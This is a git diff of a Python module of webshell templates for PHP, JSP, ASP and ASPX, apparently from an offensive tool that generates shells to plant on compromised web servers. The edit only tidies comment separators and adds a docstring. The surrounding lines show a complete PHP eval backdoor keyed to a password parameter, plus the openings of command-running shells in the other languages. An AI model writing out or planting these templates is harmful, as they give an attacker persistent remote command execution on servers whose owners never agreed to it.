@@ -7,9 +7,10 @@ All templates support placeholders:
 - {{SECRET_VALUE}}: Optional HTTP header value for authentication
 """
 
-# ============================================================================
+"""Webshell templates for various languages and authentication methods"""
+
 # PHP Templates
-# ============================================================================
+
 
 PHP_DEFAULT = """@eval($_POST["{{PASSWORD}}"]);"""
 
@@ -39,9 +40,7 @@ PHP_TEMPLATES = {
     "auth": PHP_WITH_AUTH,
 }
 
-# ============================================================================
 # JSP Templates
-# ============================================================================
 
 JSP_DEFAULT = """<%@page import="java.io.*"%>
 <%
@@ -113,9 +112,7 @@ JSP_TEMPLATES = {
     "auth": JSP_WITH_AUTH,
 }
 
-# ============================================================================
 # ASP Templates
-# ============================================================================
 
 ASP_DEFAULT = """<%
 Dim pass,cmd
@@ -160,9 +157,7 @@ ASP_TEMPLATES = {
     "auth": ASP_WITH_AUTH,
 }
 
-# ============================================================================
 # ASPX Templates
-# ============================================================================
 
 ASPX_DEFAULT = """<%@ Page Language="C#" %>
 <%@ Import Namespace="System.Diagnostics" %>
